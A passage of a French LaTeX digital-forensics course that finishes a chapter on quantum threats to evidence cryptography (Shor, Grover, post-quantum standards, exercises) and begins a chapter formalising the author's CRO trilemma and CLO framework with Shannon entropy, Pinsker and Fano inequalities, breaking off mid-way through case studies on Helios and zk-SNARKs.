\textbf{Mise en garde sur les affirmations de ``forensique quantique''}

Certains discours évoquent des concepts comme l'``authentification
quantique inviolable'', le ``scellement quantique de preuves''
(\textit{quantum seal}) ou la détection automatisée de génération
quantique aléatoire par de simples tests statistiques de seuil.

\textbf{Évaluation critique, conforme à la méthode de ce cours
(distinction constatation/analyse, Ch.~7~(UE~SEC4031))~:}
\begin{itemize}
    \item Ces concepts relèvent, en~2026, de la \textbf{recherche
          exploratoire}, pas de pratiques forensiques établies
          ou normalisées~;
    \item Aucun standard international (ISO, NIST) ne définit
          actuellement de procédure de ``scellement quantique''
          opérationnelle pour la chaîne de custody~;
    \item La distinction entre un générateur de nombres aléatoires
          quantique (QRNG) et un générateur pseudo-aléatoire
          classique (PRNG) sophistiqué par de simples tests
          statistiques de surface est un sujet de recherche actif
          et non trivial, une affirmation présentant cela comme
          une procédure forensique simple et fiable doit être
          accueillie avec un scepticisme appuyé.
\end{itemize}
\textbf{Posture recommandée~:} appliquer ici exactement le même
principe qu'au Ch.~\ref{chap:rapport} pour toute affirmation
technique dans un rapport forensique, citer la source, le
niveau de maturité réel (norme publiée~? article de recherche~?
communiqué commercial~?), et ne jamais présenter une hypothèse
de recherche comme une pratique établie.
\end{boxalert}

% ============================================================================
\section{Recommandations Pragmatiques pour la Pratique Actuelle}
\label{sec:recommandations-pratiques}
% ============================================================================

\subsection{Ce qui est raisonnable de faire dès aujourd'hui}

\begin{enumerate}
    \item \textbf{Continuer à utiliser SHA-256 (voire SHA-512)}
          pour le hachage d'intégrité (Ch.~8~(UE~SEC4031))~:
          ces fonctions ne sont pas la priorité de la menace
          quantique et restent le standard recommandé.
    \item \textbf{Privilégier AES-256 à AES-128} pour le chiffrement
          symétrique de longue conservation (sauvegardes
          forensiques, Ch.~6~(UE~SEC4031))~: marge de sécurité
          suffisante face à Grover, sans coût opérationnel
          significatif.
    \item \textbf{Pour les preuves à très longue durée de
          sensibilité} (affaires d'État, données de santé,
          secrets industriels, Ch.~\ref{chap:for-iot})~: envisager
          un re-timestamping périodique et suivre l'évolution
          des recommandations PQC des autorités internationales
          de référence.
    \item \textbf{Documenter dans le rapport forensique}
          (Ch.~\ref{chap:rapport}) l'algorithme de signature
          utilisé pour tout horodatage qualifié, afin de faciliter
          une future ré-authentification si nécessaire.
    \item \textbf{Ne pas céder à l'urgence commerciale}~: pour
          la quasi-totalité des affaires traitées dans ce cours
          (durée de pertinence~: quelques années), la menace
          quantique n'impose aucun changement de pratique immédiat
          au-delà des bonnes pratiques déjà recommandées
          (SHA-256, AES-256).
\end{enumerate}

\begin{boxjuris}
\textbf{Application au cadre camerounais}

La \loicam{2024/017}~\cite{cameroun2024donnees} (Ch.~12~(UE~SEC4031)) impose, en son
art.~27, des ``mesures techniques et organisationnelles
appropriées'' pour la sécurité des données. Cette obligation
de proportionnalité s'applique également à l'anticipation
quantique~: un responsable de traitement gérant des données de
santé ou des secrets d'État doit raisonnablement intégrer cette
menace à son analyse de risque~; un commerce de détail traitant
des données clients courantes n'a pas la même urgence. La
proportionnalité, principe déjà rencontré au Ch.~12~(UE~SEC4031),
s'applique pleinement à la planification de la transition PQC.
\end{boxjuris}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Shor menace la cryptographie asymétrique}
          (RSA, ECC, signatures, échange de clés), rupture
          potentiellement totale, mais sans calendrier scientifique
          consensuel précis.

    \item \textbf{Grover affaiblit la cryptographie symétrique}
          de façon \textbf{quadratique seulement}~: AES-256 reste
          robuste face à cette menace (équivalent~128~bits classiques).
          Ne pas confondre l'ampleur des deux menaces.

    \item \textbf{Le hash SHA-256} qui garantit l'intégrité des
          preuves (Ch.~8~(UE~SEC4031)) n'est \textbf{pas}
          structurellement menacé comme une signature RSA/ECDSA~:
          distinction essentielle souvent confondue.

    \item \textbf{Harvest Now, Decrypt Later}~: pertinent dès
          aujourd'hui pour les données à \emph{longue} durée de
          sensibilité~; moins urgent pour la majorité des affaires
          forensiques courantes de ce cours.

    \item \textbf{Standards PQC réels~:} FIPS~203 (Kyber/ML-KEM),
          FIPS~204 (Dilithium/ML-DSA), FIPS~205 (SPHINCS+/SLH-DSA), vérifiables sur \texttt{csrc.nist.gov}. La migration
          recommandée est \textbf{hybride}, pas un remplacement brutal.

    \item \textbf{Posture critique obligatoire}~: distinguer
          systématiquement un standard publié d'une affirmation
          commerciale ou d'une hypothèse de recherche
          (``quantum seal'', ``authentification quantique
          inviolable''), même méthode que la distinction
          constatation/analyse du Ch.~\ref{chap:rapport}.

    \item \textbf{Recommandations pragmatiques}~: SHA-256/512
          et AES-256 restent appropriés aujourd'hui~; re-timestamping
          périodique pour les preuves à très longue durée de
          sensibilité~; documentation systématique des algorithmes
          utilisés~; proportionnalité du risque (art.~27
          Loi~2024/017).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~26.1. Distinguer les menaces \niveaubase}]
Pour chacun des mécanismes suivants, rencontrés dans ce cours,
indiquez s'il est principalement menacé par Shor, par Grover,
par les deux, ou par aucun des deux, et justifiez~:
\begin{enumerate}[(a)]
    \item Le hash SHA-256 d'une image E01 (Ch.~9~(UE~SEC4031)).
    \item Une signature électronique qualifiée eIDAS sur un
          document européen (Ch.~11~(UE~SEC4031)).
    \item Le chiffrement BitLocker (AES-256) d'un disque dur
          saisi (Ch.~6~(UE~SEC4031)).
    \item L'établissement d'une connexion TLS lors d'une capture
          réseau (Ch.~\ref{chap:for-res}).
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~26.2. Esprit critique appliqué \niveaumoyen}]
Un fournisseur de solutions de sécurité vous présente la publicité
suivante~: ``Notre coffre-fort numérique offre une authentification
quantique inviolable grâce à notre technologie de scellement
quantique propriétaire, garantissant une protection absolue
contre toute menace présente et future.''
\begin{enumerate}[(a)]
    \item Appliquez la grille d'évaluation critique de la
          Section~\ref{sec:quantum-forensics-critique}~: quelles
          questions précises poseriez-vous à ce fournisseur~?
    \item Quels éléments de cette publicité relèvent du marketing
          plutôt que d'un standard vérifiable~?
    \item Si vous deviez recommander une solution de protection
          réelle pour des preuves à longue durée de sensibilité,
          que recommanderiez-vous à la place, en vous appuyant
          sur les standards effectivement normalisés
          (Section~\ref{sec:pqc-standards})~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~26.3. Politique d'archivage à long terme \niveauexpert}]
L'hôpital de l'affaire NTEM (Ch.~\ref{chap:cas-int}) doit conserver
les dossiers patients chiffrés pendant~30~ans conformément à la
réglementation sur les données de santé. Vous êtes consulté pour
définir une politique de protection cryptographique à long terme.
\begin{enumerate}[(a)]
    \item Appliquez le principe de proportionnalité
          (\loicam{2024/017}, art.~27)~: en quoi ce cas diffère-t-il
          d'une PME traitant des données clients courantes en
          termes d'urgence quantique~?
    \item Proposez une stratégie de chiffrement combinant
          chiffrement symétrique (pour les données elles-mêmes)
          et signature/horodatage (pour leur intégrité et
          antériorité), en justifiant chaque choix d'algorithme
          par les éléments de ce chapitre.
    \item À quelle fréquence recommanderiez-vous un re-timestamping~?
          Sur quels critères objectifs baseriez-vous cette
          fréquence (plutôt qu'une date arbitraire)~?
    \item Rédigez un paragraphe destiné au rapport d'audit de
          sécurité de l'hôpital, distinguant clairement ce qui
          relève de mesures établies et vérifiables de ce qui
          relève d'une anticipation prudente face à une incertitude
          scientifique persistante.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Ce chapitre a montré que les garanties
cryptographiques de la preuve (empreintes, signatures, horodatages)
ne sont pas absolues~: elles dépendent d'hypothèses sur la puissance
de l'adversaire et, plus profondément, d'un arbitrage entre
confidentialité, fiabilité et opposabilité. Le chapitre suivant
formalise cet arbitrage~: le Trilemme CRO et son cadre CLO, avec
les outils de la théorie de l'information qui permettent d'en
démontrer les bornes.
\end{boxinfo}
    
        % ============================================================================
% Fichier  : partie6/P06_C27_trilemme_CRO.tex
% Titre    : Le Trilemme CRO -- Formalisation et Implications
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% ============================================================================

\chapter{Le Trilemme CRO. Formalisation et Implications}
\label{chap:CRO}

\epigraph{%
    « Security is always a trade-off between confidentiality, integrity,
    and availability. The perfect balance is the holy grail of our
    field. »%
}{Bruce Schneier}

\niveauChapitre{Recherche}{%
    Mathématiques niveau master recommandées (théorie de l'information~:
    entropie, information mutuelle). Ce chapitre formalise
    rétrospectivement l'outil utilisé intuitivement dans chaque
    \texttt{boxCRO} depuis le Prologue~: relire quelques exemples
    antérieurs avant d'aborder ce chapitre est conseillé.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser les fondements de théorie de l'information
          nécessaires~: entropie de Shannon, information mutuelle,
          distance en variation totale, inégalité de Pinsker.
    \item Comprendre la formalisation rigoureuse du cadre CLO
          (\textit{Cryptographic Legal Opposability})~: définitions
          précises de $\mathsf{Conf}$, $\mathsf{Rel}$ et $\mathsf{Opp}$.
    \item Énoncer et comprendre la preuve du \textbf{théorème
          d'impossibilité} du Trilemme CRO conditionnel, établi
          par inégalités de Pinsker et de Fano.
    \item Analyser les trois études de cas documentées (Helios,
          zk-SNARKs, ECDSA) et comprendre pourquoi elles illustrent
          des points distincts de la surface de compromis.
    \item Relier la borne théorique aux limites cognitives humaines
          (capacité d'extraction institutionnelle $\Delta$) et à la
          littérature en sciences cognitives.
    \item Appliquer ce cadre théorique, désormais établi, à l'analyse
          de systèmes forensiques concrets rencontrés dans ce cours.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Un résultat établi, pas une conjecture}
% ============================================================================

Depuis le Prologue de ce cours, chaque chapitre a mobilisé une
\texttt{boxCRO} pour analyser une décision investigative~: fallait-il
collecter l'intégralité du téléphone de MBONGO ou seulement les
données pertinentes (Ch.~9~(UE~SEC4031))~? Comment arbitrer entre
conservation urgente d'une preuve cloud et respect de la vie privée
(Ch.~10~(UE~SEC4031))~? Pourquoi la chaîne de custody
maximise-t-elle l'opposabilité au prix d'une contrainte sur la
confidentialité (Ch.~8~(UE~SEC4031))~?

Ce chapitre formalise l'outil que vous avez utilisé tout au long
du cours~: le \textbf{Trilemme CRO}. Il ne s'agit plus, à la date
de rédaction de ce cours, d'une proposition spéculative~: le cadre
a été \textbf{publié dans IEEE Access}, revue à comité de lecture
indexée (facteur d'impact~$\approx 3{,}6$, classement Clarivate
JCR), en deux articles complémentaires~:

\begin{itemize}
    \item \textbf{CLO Framework}~\cite{minka2026clo} établit les
          définitions formelles de $\mathsf{Conf}$, $\mathsf{Rel}$
          et $\mathsf{Opp}$, prouve les bornes fondamentales
          (Théorème~\ref{thm:bounds} et Théorème~\ref{thm:bottleneck}
          de ce chapitre) et documente trois études de cas réelles~;
    \item \textbf{Conditional CRO Trilemma}~\cite{minka2026conditional}
          établit la \textbf{borne générale d'impossibilité} restée
          ouverte dans le premier article, le résultat central de
          ce chapitre (Théorème~\ref{thm:trilemma-general}).
\end{itemize}

Ce chapitre n'est donc pas un exposé de spéculation théorique~:
c'est la présentation pédagogique d'un résultat de recherche
publié et évalué par les pairs, replacé dans le contexte appliqué
de l'investigation numérique qui occupe ce cours.

\separateur

% ============================================================================
\section{Fondements de Théorie de l'Information}
\label{sec:fondements-ti}
% ============================================================================

La formalisation du Trilemme CRO repose entièrement sur la théorie
de l'information de Shannon~\cite{shannon1948}. Cette section pose
les quatre outils mathématiques nécessaires, avec un niveau de
détail suffisant pour suivre les démonstrations sans exiger un
cours de théorie de l'information complet.

\subsection{Entropie de Shannon}

\begin{boxdef}
\textbf{Entropie}\index{entropie de Shannon}~: pour une variable
aléatoire discrète $X$ de loi $p_X$, l'entropie de Shannon mesure
l'incertitude moyenne (en bits) associée à $X$~:
\begin{equation}
H(X) = -\sum_{x \in \mathcal{X}} p_X(x) \log_2 p_X(x)
\label{eq:entropie}
\end{equation}
L'\textbf{entropie conditionnelle} $H(X \mid Y)$ quantifie
l'incertitude résiduelle sur $X$ après observation de $Y$.
\end{boxdef}

\textbf{Intuition forensique}~: $H(V \mid C)$, l'entropie d'un
verdict $V$ (par exemple, une qualification judiciaire) sachant le
contexte institutionnel $C$ (les compétences du juge, le cadre
légal applicable), mesure le nombre de scénarios légaux distincts
qu'un décideur peut raisonnablement distinguer compte tenu de ce
qu'il sait déjà.

\subsection{Information mutuelle}

\begin{boxdef}
\textbf{Information mutuelle}~: mesure la quantité d'information
partagée entre deux variables aléatoires~:
\begin{equation}
I(X;Y) = H(X) - H(X \mid Y) = H(Y) - H(Y \mid X)
\label{eq:info-mutuelle}
\end{equation}
$I(X;Y) = 0$ signifie que $X$ et $Y$ sont indépendants~: observer
$Y$ ne renseigne en rien sur $X$. $I(X;Y) = H(X)$ signifie que $Y$
détermine entièrement $X$.
\end{boxdef}

C'est cette quantité, appliquée aux preuves cryptographiques $\Sigma$
et aux verdicts institutionnels $V$, qui formalise précisément ce
que ce cours a appelé intuitivement ``l'opposabilité'' depuis le
Ch.~8~(UE~SEC4031).

\subsection{Distance en variation totale}

\begin{boxdef}
\textbf{Distance en variation totale}~: pour deux distributions de
probabilité $P, Q$ sur le même espace~:
\begin{equation}
\mathrm{TV}(P,Q) = \frac{1}{2}\sum_{x} |P(x) - Q(x)|
= \max_{A} |P(A) - Q(A)|
\label{eq:tv}
\end{equation}
$\mathrm{TV}(P,Q) = 0$ si et seulement si $P = Q$ (distributions
parfaitement indistinguables)~; $\mathrm{TV}(P,Q) \leq 1$ toujours.
\end{boxdef}

\textbf{Intuition forensique}~: si deux messages $m_0$ et $m_1$
produisent des preuves cryptographiques dont les distributions ont
une distance en variation totale nulle, alors aucun observateur,
quels que soient ses moyens, ne peut déterminer lequel des deux
messages a réellement été chiffré. C'est précisément la définition
de la confidentialité parfaite mobilisée dans le cadre CLO.

\subsection{Inégalité de Pinsker}

\begin{boxjuris}
\textbf{Lemme (Inégalité de Pinsker)}~: pour deux distributions
$P, Q$~:
\begin{equation}
\mathrm{TV}(P,Q) \leq \sqrt{\tfrac{1}{2}\,D_{\mathrm{KL}}(P \| Q)}
\label{eq:pinsker}
\end{equation}
où $D_{\mathrm{KL}}$ est la divergence de Kullback-Leibler.
Cette inégalité \textbf{relie une mesure de distinguabilité
statistique} (variation totale) \textbf{à une mesure
d'information} (divergence, liée à l'information mutuelle).
C'est l'outil central qui permet, dans~\cite{minka2026conditional},
de traduire une exigence de fiabilité (haute information mutuelle
entre message et preuve) en une borne supérieure sur la
confidentialité atteignable.
\end{boxjuris}

\subsection{Inégalité de Fano}

\begin{boxjuris}
\textbf{Lemme (Inégalité de Fano)}~: pour un estimateur $\hat M$
d'une variable $M$ à partir d'une observation, avec probabilité
d'erreur $p_e = \Pr[\hat M \neq M]$~:
\begin{equation}
H(M \mid \hat M) \leq h(p_e) + p_e \log_2(|\mathcal{M}|-1)
\label{eq:fano}
\end{equation}
où $h(p_e)$ est l'entropie binaire. Cette inégalité formalise une
idée intuitive~: \textbf{si l'on peut deviner $M$ avec une faible
erreur, alors $M$ ne peut pas être trop incertain compte tenu de
l'observation}. Appliquée au contexte forensique, elle force la
fiabilité ($\mathsf{Rel}$ élevé, faible erreur de vérification) à
impliquer une information mutuelle minimale entre message et
preuve, l'un des deux verrous de la démonstration du théorème
principal de ce chapitre.
\end{boxjuris}

% ============================================================================
\section{Le Cadre CLO~: Définitions Formelles}
\label{sec:cadre-clo}
% ============================================================================

\subsection{Le protocole CLO}

\begin{boxdef}
\textbf{Protocole CLO} (\textit{Cryptographic Legal Opposability})
\cite{minka2026clo}~: un protocole $\mathcal{P}$ consiste en~:
\begin{itemize}
    \item des espaces~: messages $\mathcal{M}$, preuves $\Sigma$,
          contextes $\mathcal{C}$, verdicts $\mathcal{V}$~;
    \item des algorithmes~: $\mathsf{Setup}$, $\mathsf{Prove}$,
          $\mathsf{Verify}$, et surtout
          $\mathsf{Interpret}(\sigma, c) \to v$~: \textbf{l'algorithme
          d'interprétation institutionnelle} qui transforme une
          preuve cryptographique $\sigma$, dans un contexte $c$,
          en un verdict exploitable $v$.
\end{itemize}
\end{boxdef}

L'apport conceptuel central de ce cadre est de formaliser
explicitement ce que la cryptographie classique ignore~:
$\mathsf{Verify}$ garantit la correction mathématique~;
$\mathsf{Interpret}$ formalise la capacité d'un acteur institutionnel
(juge, auditeur, régulateur, ou, dans ce cours, l'OPJ et le
magistrat camerounais) à \textbf{extraire un sens exploitable} de
cette preuve. C'est cette seconde exigence, absente des définitions
de sécurité cryptographique standard, que ce cours a systématiquement
appelée ``opposabilité''.

\subsection{Les trois mesures}

\begin{boxdef}
\textbf{Confidentialité}~\cite{minka2026clo}~:
\begin{equation}
\mathsf{Conf}(\mathcal{P}) = 1 - \max_{m_0,m_1 \in \mathcal{M}}
\mathrm{TV}\bigl(P_{\Sigma \mid M=m_0},\, P_{\Sigma \mid M=m_1}\bigr)
\label{eq:conf}
\end{equation}
$\mathsf{Conf} = 1$~: les preuves sont parfaitement indistinguables
quel que soit le message (confidentialité parfaite, au sens de la
théorie de l'information). $\mathsf{Conf} = 0$~: les preuves
révèlent complètement le message.

\textbf{Fiabilité}~\cite{minka2026clo}~:
\begin{equation}
\mathsf{Rel}(\mathcal{P}) = \min_{m \in \mathcal{M}, c \in \mathcal{C}}
\Pr[\mathsf{Verify}(pk, \mathsf{Prove}(sk,m,c), c) = 1]
\label{eq:rel}
\end{equation}
$\mathsf{Rel} = 1$~: les preuves honnêtes sont toujours vérifiées
correctement (complétude parfaite).

\textbf{Opposabilité}~\cite{minka2026clo}~:
\begin{equation}
\mathsf{Opp}(\mathcal{P}, C) = \frac{I(V; \Sigma \mid C)}{H(V \mid C)}
\label{eq:opp}
\end{equation}
$\mathsf{Opp}$ mesure la \textbf{fraction de l'incertitude sur le
verdict que l'observation de la preuve permet effectivement de
lever}, étant donné le contexte institutionnel. $\mathsf{Opp} = 1$~:
la preuve détermine entièrement le verdict (opposabilité parfaite).
$\mathsf{Opp} = 0$~: la preuve n'apporte aucune information
exploitable au-delà du contexte déjà disponible.
\end{boxdef}

\begin{boxalert}
\textbf{Sur la nature mesurable de $\mathsf{Opp}$~: une innovation
du cadre CLO}

Contrairement à la confidentialité et à la fiabilité, déjà
formalisées de longue date en cryptographie, l'opposabilité au sens
de la définition~\eqref{eq:opp} \textbf{est une mesure originale}
introduite dans~\cite{minka2026clo}. C'est elle qui permet de
quantifier rigoureusement une intuition que ce cours a mobilisée
de façon qualitative depuis le Prologue~: une preuve peut être
mathématiquement irréprochable ($\mathsf{Rel}$ élevé) tout en étant
\textbf{institutionnellement inexploitable} si aucun décideur ne
peut en extraire un verdict actionnable, exactement le
``\textit{Invisible Authenticity Paradox}'' documenté dans
l'article fondateur (Section~\ref{sec:etudes-cas}).
\end{boxalert}

% ============================================================================
\section{Les Théorèmes Fondamentaux}
\label{sec:theoremes}
% ============================================================================

\subsection{Bornes de mesure et goulot d'étranglement contextuel}

\begin{boxjuris}
\textbf{Théorème~1 (Bornes de mesure)}~\cite{minka2026clo}~: pour
tout protocole CLO $\mathcal{P}$~:
\begin{equation}
0 \leq \mathsf{Conf}(\mathcal{P}) \leq 1, \quad
0 \leq \mathsf{Rel}(\mathcal{P}) \leq 1, \quad
0 \leq \mathsf{Opp}(\mathcal{P}, \mu) \leq 1
\label{thm:bounds}
\end{equation}
\end{boxjuris}

\begin{boxjuris}
\textbf{Théorème~2 (Goulot d'étranglement contextuel)}~%
\cite{minka2026clo}~: pour tout protocole CLO avec fonction
d'interprétation $\mathsf{Interpret}$ et distribution de contexte
$\mu$ sur $\mathcal{C}$~:
\begin{equation}
\mathsf{Opp}(\mathcal{P}, C) = \frac{I(V;\Sigma\mid C)}{H(V\mid C)}
\leq \min\left\{1,\; \frac{H(C)}{H(V \mid C)}\right\}
\label{thm:bottleneck}
\end{equation}
\textbf{Interprétation}~: l'opposabilité est structurellement
plafonnée par la \textbf{capacité de connaissance de
l'interprète}, c'est-à-dire par ce que le contexte institutionnel
($H(C)$~: la formation du juge, la richesse du cadre légal,
l'expertise de l'auditeur) permet effectivement de distinguer.
Aucune sophistication cryptographique supplémentaire ne peut
compenser un goulot d'étranglement de compréhension institutionnelle.
\end{boxjuris}

\begin{boiteRemarque}{Une lecture directement applicable au Cameroun}
Le Théorème~2 explique, en termes rigoureux, une observation
qualitative déjà rencontrée au Ch.~12~(UE~SEC4031)~: la
formation des magistrats camerounais au droit du numérique
constitue un facteur limitant pour l'opposabilité des preuves
numériques, indépendamment de la qualité technique de l'expertise
forensique produite. Investir dans $H(C)$ (la formation des juges,
des OPJ, des avocats) augmente le plafond théorique d'opposabilité
atteignable par \emph{tout} système de preuve, là où investir
uniquement dans la sophistication cryptographique ($\Sigma$) ne le
fait pas.
\end{boiteRemarque}

\subsection{Le Théorème d'Impossibilité Général}

L'article fondateur~\cite{minka2026clo} avait établi le Corollaire~2
(la tension qualitative entre les trois dimensions) mais laissait
ouverte, explicitement, la question d'une \textbf{borne générale
quantifiée}. C'est cette question que résout
l'article~\cite{minka2026conditional}.

\begin{boxjuris}
\textbf{Théorème~3 (Trilemme CRO Conditionnel, pour protocoles
réguliers)}~\cite{minka2026conditional}~: sous des hypothèses de
capacité d'extraction bornée, d'espace de verdicts borné et de
régularité du protocole, pour tout protocole de preuve $\mathcal{P}$
avec paramètre de sécurité $\lambda \geq 64$~:
\begin{equation}
\mathsf{Conf}(\mathcal{P}) \cdot \mathsf{Rel}(\mathcal{P}) \cdot
\mathsf{Opp}(\mathcal{P}) \;\leq\; \frac{\Delta}{\lambda} +
O(\lambda^{-2}) + \mathrm{negl}(\lambda)
\label{thm:trilemma-general}
\end{equation}
où $\Delta$ quantifie la \textbf{capacité d'extraction
institutionnelle} (le nombre de bits d'information décisionnelle
qu'un interprète humain peut effectivement traiter), et le terme
$O(\lambda^{-2})$ capture les contraintes cryptographiques d'ordre
supérieur, négligeables pour les paramètres de sécurité usuels
($\lambda \geq 128$).
\end{boxjuris}

\subsection{Esquisse de la démonstration}

La preuve complète, technique, occupe plusieurs pages
de~\cite{minka2026conditional}~; cette section en donne la structure
logique, suffisante pour en comprendre la portée sans en reproduire
tous les détails calculatoires.

\begin{enumerate}
    \item \textbf{La fiabilité force l'information mutuelle.}
          Par l'inégalité de Fano~\eqref{eq:fano}, si
          $\mathsf{Rel} \geq 1/2$ (toute preuve raisonnable doit
          au moins faire mieux qu'une pièce de monnaie), alors
          $I(M; \Sigma, C) \geq \mathsf{Rel} \cdot \lambda - 1$~:
          un système fiable nécessite que la preuve porte une
          quantité substantielle d'information sur le message.
    \item \textbf{L'opposabilité est bornée par l'extraction
          institutionnelle.} Si l'on modélise la capacité
          d'extraction humaine $K$ comme limitée à $\Delta$~bits
          (justifié en Section~\ref{sec:capacite-extraction}),
          alors $I(V;\Sigma\mid C) \lesssim I(M;\Sigma\mid C) + \Delta$.
    \item \textbf{L'espace des verdicts est borné.} Par le théorème
          de codage de source de Shannon, un espace de verdicts
          institutionnellement gérable impose
          $H(V \mid C) \geq \alpha \cdot H(C) - 1$ pour un paramètre
          $\alpha$ de granularité des verdicts.
    \item \textbf{La confidentialité est bornée par Pinsker.} Une
          forte information mutuelle $I(M;\Sigma\mid C)$ (requise
          pour la fiabilité, étape~1) implique, via
          l'inégalité~\eqref{eq:pinsker}, une borne supérieure sur
          $\mathsf{Conf}$~: plus la preuve est informative sur le
          message, moins elle peut rester confidentielle.
    \item \textbf{Combinaison et optimisation.} En combinant ces
          quatre bornes et en optimisant sur la variable
          $x = I(M;\Sigma\mid C)$ (un compromis interne entre
          fiabilité et confidentialité), on obtient le maximum
          atteignable du produit
          $\mathsf{Conf} \cdot \mathsf{Rel} \cdot \mathsf{Opp}$,
          qui se révèle être exactement~$\Delta/\lambda$ à des
          termes négligeables près.
\end{enumerate}

\begin{boxalert}
\textbf{Honnêteté scientifique sur la portée du résultat}

Comme tout résultat de recherche rigoureux, ce théorème s'applique
sous des \textbf{hypothèses explicites} (protocoles ``réguliers'',
capacité d'extraction additive et non multiplicative, espace de
verdicts borné), discutées et justifiées
dans~\cite{minka2026conditional}, mais qui délimitent le domaine
de validité du résultat. Les auteurs eux-mêmes identifient des
formes alternatives de bornes (sous-linéaire, saturante) comme
pistes de recherche future. Cette transparence sur les limites
d'un résultat est elle-même une compétence forensique~:
documenter ce qu'une analyse établit \emph{et} ce qu'elle
n'établit pas (Ch.~\ref{chap:rapport}, distinction
constatation/analyse).
\end{boxalert}

% ============================================================================
\section{Capacité d'Extraction Institutionnelle~: le Paramètre $\Delta$}
\label{sec:capacite-extraction}
% ============================================================================

\subsection{Fondement en sciences cognitives}

Le paramètre $\Delta$ n'est pas un artifice mathématique sans
ancrage empirique~: il est directement relié aux travaux fondateurs
de Miller~\cite{miller1956} sur la capacité de la mémoire de travail
humaine, estimée à $7 \pm 2$ ``chunks'' d'information.

\begin{tableaucours}{p{3.5cm}p{3.0cm}p{4.5cm}}{%
    \tableauHeader{Composante} &
    \tableauHeader{Estimation} &
    \tableauHeader{Justification}
}
Capacité individuelle de base & $\approx 21$~bits &
    7~chunks~$\times$~3~bits par chunk (distinction entre~8~états
    possibles par chunk) \\
+ Documentation institutionnelle & $+5$ à $10$~bits &
    Procédures écrites, matériaux de référence
    (ex.~: guides de qualification, Ch.~12~(UE~SEC4031)) \\
+ Collaboration & $+10$ à $20$~bits &
    Délibération multi-acteurs, mise en commun d'expertise
    (collège de juges, équipe d'enquête) \\
+ Spécialisation & $+10$ à $15$~bits &
    Formation spécifique au-delà de la cognition générale
    (expert agréé, Ch.~12~(UE~SEC4031)) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~27.1. Construction du paramètre
$\Delta$ pour une institution bien dotée}\end{center}

Cette construction additive conduit à une estimation
$\Delta \in [20, 60]$~bits pour des institutions bien dotées en
ressources, cohérente avec les analyses empiriques de contextes
réels présentées dans les deux articles.

\subsection{Estimations empiriques de $H(C)$ par contexte}

\begin{tableaucours}{p{3.5cm}p{2.5cm}p{5.0cm}}{%
    \tableauHeader{Contexte institutionnel} &
    \tableauHeader{$H(C)$ estimé} &
    \tableauHeader{Justification}
}
Tribunal de juridiction générale & $\approx 8$~bits &
    $\approx 256$~contextes évidentiaires distingués \\
Régulateur spécialisé & $\approx 11$~bits &
    $\approx 2048$~contextes (réglementation financière détaillée) \\
Expert technique de domaine & $\approx 20$~bits &
    $\approx 10^6$~contextes (connaissance fine du domaine) \\
Contexte électoral (Helios) & $30$ à $50$~bits &
    Registre des électeurs, structure du scrutin, règles du
    district \\
Conformité financière (zk-SNARKs) & $40$ à $70$~bits &
    Historique des transactions, réglementation, pistes d'audit \\
Signature contractuelle (ECDSA) & $20$ à $40$~bits &
    Parties, termes, juridiction, contexte volontairement
    restreint \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~27.2. Estimations empiriques de
$H(C)$ par type de contexte (d'après~\cite{minka2026clo,minka2026conditional})}\end{center}

\begin{boiteRemarque}{Le paradoxe de l'écart de capacité}
Une observation frappante des deux articles~: atteindre une
opposabilité significative ($\mathsf{Opp} \gtrsim 0{,}5$) pour des
paramètres de sécurité cryptographique usuels ($\lambda = 128$
à~$256$~bits) exigerait un contexte institutionnel
$H(C) \approx 64$ à~$128$~bits. Or les estimations empiriques de
contextes institutionnels réels (Tableau~27.2) plafonnent typiquement
à~$8$ à~$20$~bits, un \textbf{écart d'un facteur~5 à~10} entre
ce que la cryptographie moderne exige et ce que les institutions
peuvent effectivement traiter. C'est ce paradoxe que les auteurs
nomment l'\textit{Invisible Authenticity Paradox}.
\end{boiteRemarque}

% ============================================================================
\section{Trois Études de Cas Documentées}
\label{sec:etudes-cas}
% ============================================================================

L'article fondateur~\cite{minka2026clo} analyse trois systèmes
cryptographiques réellement déployés, révélant des positions
distinctes et cohérentes sur la surface de compromis CRO.

\subsection{Helios~: vérifiabilité électorale}

Le protocole de vote électronique Helios~\cite{adida2009helios}
combine chiffrement ElGamal et preuves à divulgation nulle pour
garantir l'intégrité du scrutin sans compromettre le secret du vote.

\begin{boxscenario}{Helios, l'institutionnalisation impossible}
Lors de l'élection présidentielle de l'\textit{Université catholique
de Louvain} (mars~2009)~\cite{adida2009university}, les
``\textit{trustees}'' (fiduciaires) sélectionnés parmi des étudiants
et le personnel administratif, choisis pour leur représentativité
institutionnelle, pas pour leur expertise cryptographique,
n'ont pas pu exécuter eux-mêmes les opérations de génération et de
déchiffrement des clés. Des experts cryptographiques externes ont
dû intervenir. Plus frappant encore~: l'\textit{International
Association for Cryptologic Research} (IACR), pourtant composée
de cryptographes professionnels, a dû \textbf{annuler entièrement}
son élection de novembre~2025 après qu'un fiduciaire a
irrémédiablement perdu sa portion de la clé de déchiffrement
distribuée~\cite{iacr2025}.
\end{boxscenario}

\textbf{Lecture CRO}~: Helios atteint une confidentialité et une
fiabilité élevées (le secret du vote et l'intégrité du dépouillement
sont mathématiquement garantis), mais une opposabilité
institutionnelle estimée à $\mathsf{Opp} \approx 0{,}50$, même
des cryptographes professionnels peinent à opérer le système de
façon autonome.

\subsection{zk-SNARKs~: conformité financière}

Les preuves à divulgation nulle succinctes (zk-SNARKs) permettent
à une institution financière de prouver sa conformité réglementaire
(lutte anti-blanchiment, filtrage des sanctions) via une preuve
de quelques centaines d'octets, sans révéler le détail des
transactions sous-jacentes.

\textbf{Lecture CRO}~: confidentialité quasi-parfaite des
transactions individuelles, mais lorsqu'un schéma suspect émerge
et qu'une investigation ciblée devient nécessaire (exactement le
type de situation rencontré au Ch.~\ref{chap:for-cloud} de ce
cours, analyse blockchain), l'opacité cryptographique qui protège
